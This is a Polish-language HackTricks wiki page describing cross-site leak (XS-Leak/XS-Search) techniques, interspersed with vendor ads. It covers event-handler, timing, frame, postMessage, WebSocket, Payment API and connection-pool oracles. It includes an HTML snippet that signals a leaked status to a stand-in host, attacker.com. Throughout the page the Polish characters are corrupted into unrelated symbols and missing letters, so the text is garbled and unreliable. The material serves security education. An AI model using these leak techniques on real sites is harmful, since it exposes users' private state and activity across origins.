# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

U偶yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby atwo budowa i **automatyzowa przepywy pracy** zasilane przez **najbardziej zaawansowane** narzdzia spoecznociowe na wiecie.\
Uzyskaj dostp ju偶 dzi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si trikami hackingowymi, przesyajc PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}

## Podstawowe informacje

XS-Search to metoda u偶ywana do **ekstrakcji informacji z r贸偶nych 藕r贸de** poprzez wykorzystanie **wra偶liwoci kana贸w bocznych**.

Kluczowe komponenty zaanga偶owane w ten atak obejmuj:

* **Wra偶liwa strona internetowa**: Strona docelowa, z kt贸rej zamierzamy wyodrbni informacje.
* **Strona internetowa atakujcego**: Zoliwa strona stworzona przez atakujcego, kt贸r odwiedza ofiara, hostujca exploit.
* **Metoda wczenia**: Technika stosowana do wczenia Wra偶liwej Strony w Stron Atakujcego (np. window.open, iframe, fetch, tag HTML z href itp.).
* **Technika wycieku**: Techniki u偶ywane do rozr贸偶niania r贸偶nic w stanie Wra偶liwej Strony na podstawie informacji zebranych za pomoc metody wczenia.
* **Stany**: Dwa potencjalne warunki Wra偶liwej Strony, kt贸re atakujcy stara si rozr贸偶ni.
* **Wykrywalne r贸偶nice**: Obserwowalne r贸偶nice, na kt贸rych atakujcy polega, aby wywnioskowa stan Wra偶liwej Strony.

### Wykrywalne r贸偶nice

Kilka aspekt贸w mo偶na analizowa, aby odr贸偶ni stany Wra偶liwej Strony:

* **Kod statusu**: Rozr贸偶nianie midzy **r贸偶nymi kodami statusu odpowiedzi HTTP** z r贸偶nych 藕r贸de, takimi jak bdy serwera, bdy klienta lub bdy uwierzytelniania.
* **U偶ycie API**: Identyfikacja **u偶ycia Web API** na stronach, ujawniajca, czy strona z innego 藕r贸da korzysta z konkretnego JavaScript Web API.
* **Przekierowania**: Wykrywanie nawigacji do r贸偶nych stron, nie tylko przekierowa HTTP, ale tak偶e tych wywoanych przez JavaScript lub HTML.
* **Zawarto strony**: Obserwowanie **r贸偶nic w treci odpowiedzi HTTP** lub w podzasobach strony, takich jak **liczba osadzonych ramek** lub r贸偶nice w rozmiarze obraz贸w.
* **Nag贸wek HTTP**: Zauwa偶enie obecnoci lub ewentualnie wartoci **konkretnego nag贸wka odpowiedzi HTTP**, w tym nag贸wk贸w takich jak X-Frame-Options, Content-Disposition i Cross-Origin-Resource-Policy.
* **Czas**: Zauwa偶enie staych r贸偶nic czasowych midzy dwoma stanami.

### Metody wczenia

* **Elementy HTML**: HTML oferuje r贸偶ne elementy do **wczenia zasob贸w z r贸偶nych 藕r贸de**, takie jak arkusze styl贸w, obrazy czy skrypty, zmuszajc przegldark do 偶dania zasobu nie-HTML. Kompilacj potencjalnych element贸w HTML do tego celu mo偶na znale藕 na [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
* **Ramki**: Elementy takie jak **iframe**, **object** i **embed** mog osadza zasoby HTML bezporednio na stronie atakujcego. Jeli strona **nie ma ochrony przed ramkami**, JavaScript mo偶e uzyska dostp do obiektu okna osadzonego zasobu za pomoc waciwoci contentWindow.
* **Wyskakujce okna**: Metoda **`window.open`** otwiera zas贸b w nowej karcie lub oknie, zapewniajc **uchwyt okna** dla JavaScript do interakcji z metodami i waciwociami zgodnie z SOP. Wyskakujce okna, czsto u偶ywane w jednolitym logowaniu, omijaj ograniczenia ramkowe i ciasteczkowe zasobu docelowego. Jednak nowoczesne przegldarki ograniczaj tworzenie wyskakujcych okien do okrelonych dziaa u偶ytkownika.
* **呕dania JavaScript**: JavaScript pozwala na bezporednie 偶dania do zasob贸w docelowych za pomoc **XMLHttpRequests** lub **Fetch API**. Te metody oferuj precyzyjn kontrol nad 偶daniem, na przykad wybierajc, czy pod偶a za przekierowaniami HTTP.

### Techniki wycieku

* **Obsuga zdarze**: Klasyczna technika wycieku w XS-Leaks, gdzie obsugi zdarze takie jak **onload** i **onerror** dostarczaj informacji o sukcesie lub niepowodzeniu adowania zasob贸w.
* **Komunikaty o bdach**: Wyjtki JavaScript lub specjalne strony bd贸w mog dostarcza informacji o wycieku, zar贸wno bezporednio z komunikatu o bdzie, jak i poprzez rozr贸偶nienie midzy jego obecnoci a brakiem.
* **Globalne ograniczenia**: Fizyczne ograniczenia przegldarki, takie jak pojemno pamici lub inne narzucone ograniczenia przegldarki, mog sygnalizowa, kiedy osignito pr贸g, su偶c jako technika wycieku.
* **Globalny stan**: Wykrywalne interakcje z **globalnymi stanami** przegldarek (np. interfejs historii) mog by wykorzystywane. Na przykad, **liczba wpis贸w** w historii przegldarki mo偶e dostarcza wskaz贸wek dotyczcych stron z r贸偶nych 藕r贸de.
* **API wydajnoci**: To API dostarcza **szczeg贸y wydajnoci bie偶cej strony**, w tym czas sieciowy dla dokumentu i zaadowanych zasob贸w, umo偶liwiajc wnioski na temat 偶danych zasob贸w.
* **Czytelne atrybuty**: Niekt贸re atrybuty HTML s **czytelne z r贸偶nych 藕r贸de** i mog by u偶ywane jako technika wycieku. Na przykad, waciwo `window.frame.length` pozwala JavaScript na zliczanie ramek osadzonych w stronie internetowej z r贸偶nych 藕r贸de.

## Narzdzie XSinator i dokument

XSinator to automatyczne narzdzie do **sprawdzania przegldarek pod ktem kilku znanych XS-Leaks** opisanych w jego dokumencie: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Mo偶esz **uzyska dostp do narzdzia w** [**https://xsinator.com/**](https://xsinator.com/)

{% hint style="warning" %}
**Wykluczone XS-Leaks**: Musielimy wykluczy XS-Leaks, kt贸re polegaj na **workerach serwisowych**, poniewa偶 mogyby zak贸ca inne wycieki w XSinator. Ponadto zdecydowalimy si **wykluczy XS-Leaks, kt贸re polegaj na bdnej konfiguracji i bdach w konkretnej aplikacji internetowej**. Na przykad, bdne konfiguracje CrossOrigin Resource Sharing (CORS), wycieki postMessage lub Cross-Site Scripting. Dodatkowo wykluczylimy XS-Leaks oparte na czasie, poniewa偶 czsto s wolne, haaliwe i niedokadne.
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
U偶yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby atwo budowa i **automatyzowa przepywy pracy** zasilane przez **najbardziej zaawansowane** narzdzia spoecznociowe na wiecie.\
Uzyskaj dostp ju偶 dzi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## **Techniki oparte na czasie**

Niekt贸re z poni偶szych technik bd wykorzystywa czas jako cz procesu wykrywania r贸偶nic w mo偶liwych stanach stron internetowych. Istniej r贸偶ne sposoby mierzenia czasu w przegldarce internetowej.

**Zegary**: API [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) pozwala programistom uzyska pomiary czasu o wysokiej rozdzielczoci.\
Istnieje znaczna liczba API, kt贸re atakujcy mog nadu偶ywa do tworzenia niejawnych zegar贸w: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), animacje CSS i inne.\
Wicej informacji: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Techniki obsugi zdarze

### Onload/Onerror

* **Metody wczenia**: Ramki, elementy HTML
* **Wykrywalna r贸偶nica**: Kod statusu
* **Wicej informacji**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Podsumowanie**: Jeli pr贸bujesz zaadowa zas贸b, zdarzenia onerror/onload s wywoywane, gdy zas贸b jest adowany pomylnie/niepomylnie, co pozwala ustali kod statusu.
* **Przykad kodu**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

Przykad kodu pr贸buje **zaadowa obiekty skrypt贸w z JS**, ale **inne tagi** takie jak obiekty, arkusze styl贸w, obrazy, d藕wiki mog by r贸wnie偶 u偶ywane. Ponadto mo偶liwe jest r贸wnie偶 wstrzyknicie **tagu bezporednio** i zadeklarowanie zdarze `onload` i `onerror` wewntrz tagu (zamiast wstrzykiwa je z JS).

Istnieje r贸wnie偶 wersja tego ataku bez skrypt贸w:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
W tym przypadku, jeli `example.com/404` nie zostanie znaleziony, zaadowana zostanie `attacker.com/?error`.

### Onload Timing

* **Metody wczenia**: Elementy HTML
* **Wykrywalna r贸偶nica**: Czas (zazwyczaj z powodu zawartoci strony, kodu statusu)
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Podsumowanie:** API [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **mo偶e by u偶ywane do pomiaru, ile czasu zajmuje wykonanie 偶dania.** Jednak inne zegary mog by u偶ywane, takie jak [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming), kt贸re mog identyfikowa zadania trwajce du偶ej ni偶 50 ms.
* **Przykad kodu**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) inny przykad w:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Onload Timing + Wymuszone Ci偶kie Zadanie

Ta technika jest podobna do poprzedniej, ale **atakujcy** r贸wnie偶 **wymusi** pewn akcj, aby zaja **odpowiedni ilo czasu**, gdy **odpowied藕 jest pozytywna lub negatywna** i zmierzy ten czas.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Timing

* **Metody wczenia**: Ramki
* **Wykrywalna r贸偶nica**: Czas (zazwyczaj z powodu zawartoci strony, kodu statusu)
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Podsumowanie:** Zegar [SharedArrayBuffer](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) mo偶e by u偶ywany do pomiaru, ile czasu zajmuje wykonanie 偶dania. Inne zegary mog by u偶ywane.
* **Przykad kodu**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Czas potrzebny na pobranie zasobu mo偶na zmierzy, wykorzystujc zdarzenia [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) i [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event). Zdarzenie **`beforeunload`** jest wywoywane, gdy przegldarka ma zamiar przej do nowej strony, podczas gdy zdarzenie **`unload`** wystpuje, gdy nawigacja faktycznie ma miejsce. R贸偶nic czasow midzy tymi dwoma zdarzeniami mo偶na obliczy, aby okreli **czas, jaki przegldarka spdzia na pobieraniu zasobu**.

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Metody wczenia**: Ramki
* **Wykrywalna r贸偶nica**: Czas (zazwyczaj z powodu zawartoci strony, kodu statusu)
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Podsumowanie:** API [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) mo偶e by u偶ywane do pomiaru, ile czasu zajmuje wykonanie 偶dania. Inne zegary mog by u偶ywane.
* **Przykad kodu**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Zaobserwowano, 偶e w przypadku braku [Ochrony Ramkowej](https://xsleaks.dev/docs/defenses/opt-in/xfo/), czas potrzebny na zaadowanie strony i jej zasob贸w podrzdnych przez sie mo偶e by mierzony przez atakujcego. Pomiar ten jest zazwyczaj mo偶liwy, poniewa偶 handler `onload` iframe jest wywoywany dopiero po zakoczeniu adowania zasob贸w i wykonania JavaScript. Aby obej zmienno wprowadzon przez wykonanie skryptu, atakujcy mo偶e zastosowa atrybut [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) w `<iframe>`. Wczenie tego atrybutu ogranicza wiele funkcji, w szczeg贸lnoci wykonanie JavaScript, co uatwia pomiar, kt贸ry jest g贸wnie wpywany przez wydajno sieci.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

* **Metody wczenia**: Ramki
* **Wykrywalna r贸偶nica**: Zawarto strony
* **Wicej informacji**:
* **Podsumowanie**: Jeli mo偶esz spowodowa bd na stronie, gdy dostpna jest poprawna zawarto, i sprawi, 偶e zaaduje si poprawnie, gdy dostpna jest jakakolwiek zawarto, mo偶esz stworzy ptl do wyodrbnienia wszystkich informacji bez mierzenia czasu.
* **Przykad kodu**:

Za贸偶my, 偶e mo偶esz **wstawi** **stron**, kt贸ra ma **tajn** zawarto **w ramce Iframe**.

Mo偶esz **sprawi, aby ofiara wyszukiwaa** plik, kt贸ry zawiera "_**flag**_" u偶ywajc **Iframe** (na przykad wykorzystujc CSRF). Wewntrz Iframe wiesz, 偶e _**zdarzenie onload**_ bdzie **wykonywane zawsze przynajmniej raz**. Nastpnie mo偶esz **zmieni** **URL** **iframe**, zmieniajc tylko **zawarto** **hasha** w URL.

Na przykad:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Jeli pierwszy URL zosta **pomylnie zaadowany**, to, gdy **zmienisz** cz **hash** URL, **zdarzenie onload** **nie zostanie wywoane** ponownie. Ale **jeli** strona miaa jaki rodzaj **bdu** podczas **adowania**, to **zdarzenie onload** zostanie **wywoane ponownie**.

Wtedy mo偶esz **rozr贸偶ni** midzy **poprawnie** zaadowan stron a stron, kt贸ra ma **bd** podczas dostpu.

### Wykonanie Javascript

* **Metody wczenia**: Ramki
* **Wykrywalna r贸偶nica**: Zawarto strony
* **Wicej informacji**:
* **Podsumowanie:** Jeli **strona** **zwraca** **wra偶liw** zawarto, **lub** zawarto, kt贸r mo偶na **kontrolowa** przez u偶ytkownika. U偶ytkownik m贸gby ustawi **wa偶ny kod JS w negatywnym przypadku**, **adujc** ka偶dy pr贸b wewntrz **`<script>`** tag贸w, wic w **negatywnych** przypadkach kod **atakujcego** jest **wykonywany**, a w **pozytywnych** przypadkach **nic** nie zostanie wykonane.
* **Przykad kodu:**

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Metody wczenia**: Elementy HTML
* **Wykrywalna r贸偶nica**: Kod statusu i nag贸wki
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Podsumowanie**: **Cross-Origin Read Blocking (CORB)** to rodek bezpieczestwa, kt贸ry zapobiega adowaniu przez strony internetowe niekt贸rych wra偶liwych zasob贸w z innych 藕r贸de, aby chroni przed atakami takimi jak **Spectre**. Jednak atakujcy mog wykorzysta jego ochronne zachowanie. Gdy odpowied藕 podlegajca **CORB** zwraca _**chroniony przez CORB**_ `Content-Type` z `nosniff` i kodem statusu `2xx`, **CORB** usuwa tre odpowiedzi i nag贸wki. Atakujcy obserwujcy to mog wywnioskowa kombinacj **kodu statusu** (wskazujcego na sukces lub bd) i `Content-Type` (oznaczajcego, czy jest chroniony przez **CORB**), co prowadzi do potencjalnego wycieku informacji.
* **Przykad kodu**:

Sprawd藕 link do wicej informacji, aby uzyska wicej informacji o ataku.

### onblur

* **Metody wczenia**: Ramki
* **Wykrywalna r贸偶nica**: Zawarto strony
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Podsumowanie**: Wycieki wra偶liwych danych z atrybutu id lub name.
* **Przykad kodu**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Mo偶liwe jest **zaadowanie strony** wewntrz **iframe** i u偶ycie **`#id_value`**, aby skupi stron na elemencie iframe z wskazanym id, a nastpnie, jeli zostanie wywoany sygna **`onblur`**, element ID istnieje.\
Mo偶esz przeprowadzi ten sam atak z tagami **`portal`**.

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Metody wczenia**: Ramki, Pop-upy
* **Wykrywalna r贸偶nica**: U偶ycie API
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Podsumowanie**: Zbieranie wra偶liwych informacji z postMessage lub u偶ycie obecnoci postMessages jako orakula do poznania statusu u偶ytkownika na stronie
* **Przykad kodu**: `Jakikolwiek kod nasuchujcy wszystkie postMessages.`

Aplikacje czsto wykorzystuj [`postMessage` broadcasts](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) do komunikacji midzy r贸偶nymi 藕r贸dami. Jednak ta metoda mo偶e nieumylnie ujawnia **wra偶liwe informacje**, jeli parametr `targetOrigin` nie jest odpowiednio okrelony, co pozwala ka偶demu oknu na odbieranie wiadomoci. Ponadto sam akt odbierania wiadomoci mo偶e dziaa jako **orakulum**; na przykad, niekt贸re wiadomoci mog by wysyane tylko do u偶ytkownik贸w, kt贸rzy s zalogowani. Dlatego obecno lub brak tych wiadomoci mo偶e ujawnia informacje o stanie lub to偶samoci u偶ytkownika, takie jak to, czy s uwierzytelnieni, czy nie.

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

U偶yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby atwo budowa i **automatyzowa przepywy pracy** zasilane przez **najbardziej zaawansowane** narzdzia spoecznociowe na wiecie.\
Uzyskaj dostp ju偶 dzi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Techniki globalnych limit贸w

### WebSocket API

* **Metody wczenia**: Ramki, Pop-upy
* **Wykrywalna r贸偶nica**: U偶ycie API
* **Wicej informacji**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Podsumowanie**: Wyciekanie liczby pocze WebSocket strony z innego 藕r贸da przez wyczerpanie limitu pocze WebSocket.
* **Przykad kodu**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

Mo偶liwe jest zidentyfikowanie, czy i ile **pocze WebSocket u偶ywa strona docelowa**. Pozwala to atakujcemu na wykrycie stan贸w aplikacji i wyciek informacji zwizanych z liczb pocze WebSocket.

Jeli jedno **藕r贸do** u偶ywa **maksymalnej liczby obiekt贸w pocze WebSocket**, niezale偶nie od stanu ich pocze, utworzenie **nowych obiekt贸w spowoduje wyjtki JavaScript**. Aby przeprowadzi ten atak, strona atakujca otwiera stron docelow w pop-upie lub iframe, a nastpnie, po zaadowaniu strony docelowej, pr贸buje utworzy maksymaln liczb mo偶liwych pocze WebSocket. **Liczba zgoszonych wyjtk贸w** to **liczba pocze WebSocket u偶ywanych przez okno strony docelowej**.

### Payment API

* **Metody wczenia**: Ramki, Pop-upy
* **Wykrywalna r贸偶nica**: U偶ycie API
* **Wicej informacji**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Podsumowanie**: Wykrywanie 偶dania patnoci, poniewa偶 tylko jedno mo偶e by aktywne w danym czasie.
* **Przykad kodu**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Ten XS-Leak umo偶liwia atakujcemu **wykrycie, kiedy strona z innego 藕r贸da inicjuje 偶danie patnoci**.

Poniewa偶 **tylko jedno 偶danie patnoci mo偶e by aktywne** w danym czasie, jeli strona docelowa korzysta z API 偶dania patnoci, wszelkie dalsze pr贸by u偶ycia tego API zakocz si niepowodzeniem i spowoduj **wyjtek JavaScript**. Atakujcy mo偶e to wykorzysta, **okresowo pr贸bujc wywietli interfejs API patnoci**. Jeli jedna pr贸ba spowoduje wyjtek, strona docelowa aktualnie z niego korzysta. Atakujcy mo偶e ukry te okresowe pr贸by, natychmiast zamykajc interfejs po jego utworzeniu.

### Mierzenie ptli zdarze <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Metody wczenia**:
* **Wykrywalna r贸偶nica**: Czas (zwykle z powodu zawartoci strony, kodu statusu)
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Podsumowanie:** Mierzenie czasu wykonania strony, wykorzystujc jednowtkow ptl zdarze JS.
* **Przykad kodu**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript dziaa na modelu wsp贸bie偶noci [jednowtkowej ptli zdarze](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop), co oznacza, 偶e **mo偶e wykonywa tylko jedno zadanie w danym czasie**. Ta cecha mo偶e by wykorzystana do oszacowania **jak dugo kod z innego 藕r贸da zajmuje wykonanie**. Atakujcy mo偶e zmierzy czas wykonania swojego kodu w ptli zdarze, nieustannie wysyajc zdarzenia o staych waciwociach. Te zdarzenia bd przetwarzane, gdy pula zdarze bdzie pusta. Jeli inne 藕r贸da r贸wnie偶 wysyaj zdarzenia do tej samej puli, **atakujcy mo偶e wywnioskowa czas, jaki zajmuje wykonanie tych zewntrznych zdarze, obserwujc op贸藕nienia w wykonaniu swoich wasnych zada**. Ta metoda monitorowania ptli zdarze pod ktem op贸藕nie mo偶e ujawnia czas wykonania kodu z r贸偶nych 藕r贸de, potencjalnie ujawniajc wra偶liwe informacje.

{% hint style="warning" %}
W pomiarze czasu wykonania mo偶liwe jest **eliminowanie** **czynnik贸w sieciowych**, aby uzyska **dokadniejsze pomiary**. Na przykad, adujc zasoby u偶ywane przez stron przed jej zaadowaniem.
{% endhint %}

### Zajta ptla zdarze <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Metody wczenia**:
* **Wykrywalna r贸偶nica**: Czas (zwykle z powodu zawartoci strony, kodu statusu)
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Podsumowanie:** Jedna z metod mierzenia czasu wykonania operacji w sieci polega na celowym blokowaniu ptli zdarze w wtku, a nastpnie mierzeniu **jak dugo zajmuje ponowne udostpnienie ptli zdarze**. Wstawiajc operacj blokujc (tak jak dugie obliczenia lub synchronizowane wywoanie API) do ptli zdarze i monitorujc czas, jaki zajmuje rozpoczcie wykonania kolejnego kodu, mo偶na wywnioskowa czas trwania zada, kt贸re byy wykonywane w ptli zdarze w czasie blokady. Ta technika wykorzystuje jednowtkowy charakter ptli zdarze JavaScript, gdzie zadania s wykonywane sekwencyjnie, i mo偶e dostarczy informacji o wydajnoci lub zachowaniu innych operacji dzielcych ten sam wtek.
* **Przykad kodu**:

Znaczn zalet techniki mierzenia czasu wykonania przez blokowanie ptli zdarze jest jej potencja do obejcia **Izolacji Stron**. **Izolacja Stron** to funkcja zabezpiecze, kt贸ra oddziela r贸偶ne strony internetowe w osobnych procesach, majca na celu zapobieganie bezporedniemu dostpowi zoliwych stron do wra偶liwych danych z innych stron. Jednak wpywajc na czas wykonania innego 藕r贸da poprzez wsp贸ln ptl zdarze, atakujcy mo偶e porednio wydoby informacje o dziaaniach tego 藕r贸da. Ta metoda nie polega na bezporednim dostpie do danych innego 藕r贸da, lecz raczej na obserwacji wpywu dziaa tego 藕r贸da na wsp贸ln ptl zdarze, tym samym omijajc ochronne bariery ustanowione przez **Izolacj Stron**.

{% hint style="warning" %}
W pomiarze czasu wykonania mo偶liwe jest **eliminowanie** **czynnik贸w sieciowych**, aby uzyska **dokadniejsze pomiary**. Na przykad, adujc zasoby u偶ywane przez stron przed jej zaadowaniem.
{% endhint %}

### Pula pocze

* **Metody wczenia**: 呕dania JavaScript
* **Wykrywalna r贸偶nica**: Czas (zwykle z powodu zawartoci strony, kodu statusu)
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Podsumowanie:** Atakujcy m贸gby zablokowa wszystkie gniazda opr贸cz 1, zaadowa stron docelow i jednoczenie zaadowa inn stron, czas, a偶 ostatnia strona zacznie si adowa, to czas, jaki zaja strona docelowa.
* **Przykad kodu**:

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

Przegldarki wykorzystuj gniazda do komunikacji z serwerem, ale z powodu ograniczonych zasob贸w systemu operacyjnego i sprztu, **przegldarki s zmuszone narzuca limit** na liczb r贸wnoczesnych gniazd. Atakujcy mog wykorzysta to ograniczenie poprzez nastpujce kroki:

1. Ustali limit gniazd przegldarki, na przykad 256 globalnych gniazd.
2. Zajmowa 255 gniazd przez du偶szy czas, inicjujc 255 偶da do r贸偶nych host贸w, zaprojektowanych w celu utrzymania pocze otwartych bez ich zakoczenia.
3. Wykorzysta 256. gniazdo do wysania 偶dania do strony docelowej.
4. Spr贸bowa 257. 偶dania do innego hosta. Poniewa偶 wszystkie gniazda s zajte (zgodnie z krokami 2 i 3), to 偶danie bdzie oczekiwa, a偶 gniazdo stanie si dostpne. Op贸藕nienie przed tym 偶daniem dostarcza atakujcemu informacji o czasie aktywnoci sieciowej zwizanej z 256. gniazdem (gniazdo strony docelowej). To wnioskowanie jest mo偶liwe, poniewa偶 255 gniazd z kroku 2 s nadal zajte, co sugeruje, 偶e jakiekolwiek nowo dostpne gniazdo musi by tym zwolnionym z kroku 3. Czas, jaki zajmuje 256. gniazdu, aby sta si dostpnym, jest zatem bezporednio zwizany z czasem, jaki zajmuje zakoczenie 偶dania do strony docelowej.

Wicej informacji: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Pula pocze wedug docelowego

* **Metody wczenia**: 呕dania JavaScript
* **Wykrywalna r贸偶nica**: Czas (zwykle z powodu zawartoci strony, kodu statusu)
* **Wicej informacji**:
* **Podsumowanie:** To jak poprzednia technika, ale zamiast u偶ywa wszystkich gniazd, Google **Chrome** nakada limit **6 r贸wnoczesnych 偶da do tego samego 藕r贸da**. Jeli **zablokujemy 5** i nastpnie **uruchomimy 6.** 偶danie, mo偶emy **zmierzy** czas, a jeli udao nam si sprawi, aby **strona ofiary wysaa** wicej **偶da** do tego samego punktu kocowego, aby wykry **status** **strony**, **6. 偶danie** zajmie **wicej czasu** i mo偶emy to wykry.

